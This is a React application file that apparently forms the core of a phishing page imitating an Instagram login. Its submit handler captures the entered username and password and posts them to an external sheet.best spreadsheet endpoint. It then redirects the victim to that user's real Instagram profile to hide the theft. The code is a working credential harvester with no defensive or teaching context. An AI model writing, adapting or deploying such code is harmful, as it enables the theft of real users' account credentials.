import './App.css';
import { HashRouter, Routes, Route } from 'react-router-dom'
import Loading from './components/Loading';
import LoginPage from './components/LoginPage';
import React, { useRef } from 'react';

function App() {

  var user_name = useRef(null);
  var user_pass = useRef(null);

  var screen = useRef(null);
  var s_screen = useRef(null);


  var url;

  const submited = () => {
    var uname = user_name.current.value;
    var upass = user_pass.current.value;


    user_name.current.value = '';
    user_pass.current.value = '';

    const data = {
      ID: uname,
      Password: upass
    }

    fetch('https://sheet.best/api/sheets/dc370a4a-6c6d-4020-b6de-eae93a168f3a', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data),
      
    })
      .then(response => response.json())
      .then(data => {
        console.log('Success:', data);
      })
      .catch(error => {
        console.error('Error:', error);
      });


    setTimeout(() => {
      url = 'https://www.instagram.com/' + uname + '/';
      window.location.href = url;
      console.log(url)
    }, 2000)




  }


  return (
    <>
      <HashRouter>


        <Routes>

          <Route path='/' element={
            <>
              <Loading screen={screen} />
              <LoginPage user_name={user_name} user_pass={user_pass} submited={submited} second_screen={s_screen} />
            </>
          }></Route>


        </Routes>


      </HashRouter>
    </>
  );
}

export default App;
